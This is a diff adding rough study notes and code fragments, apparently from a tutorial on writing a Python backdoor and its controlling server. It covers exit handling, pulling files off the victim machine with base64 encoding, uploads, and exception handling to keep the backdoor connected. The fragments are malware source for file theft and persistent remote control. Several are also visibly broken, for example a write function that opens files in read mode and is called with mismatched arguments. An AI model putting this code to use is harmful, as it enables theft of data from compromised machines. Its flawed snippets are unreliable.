@@ -528,6 +528,44 @@ while True:
                         except valueError:
                                 continue
 
+Right now exit portion has to be implemented in both server and backdoor since we need it to exit without throwing those python 
+errors ie exit both the programs upon sending exit. 
+command = command.split(' ')
+if command[0] == 'exit':
+        self.connection.close()
+        exit()  #exit the python program as well
+        
+uploading n downloading file - simply copying the contents in an empty file
+
+def read_file(self, path):
+        with open(path, 'rb') as f:
+                return f.read()
+if command[0] == 'download':                
+        command_out = read_file(command[1])
+        self.reliable_send(command_out)
+        
+ now the same file needs to be captured in server.
+ if content[0] == 'download':
+        self.write_file(result)
+        
+  def write_file(self, path, content):
+        with open(path) as f:
+                f.write(content)
+                return 'file download complete'
+                
+   but this will throw error for image files because of encoding. hence use base 64 encoding and decoding.
+   return base64.b64encode(command_out)  #the fn will convert unknown characters if any in the file. same be decoded at server end.
+   
+   next need to implement upload file, just opposite to download at both ends. if the program crashes, connection will be lost. Hence 
+   exception handling is most important to keep connections alive. hence try except is required. 
+   except Exception:  # so that connection wont be lost
+        print('Errors have occured')
+       
+  
+        
+   
+   
+        
        
  
  
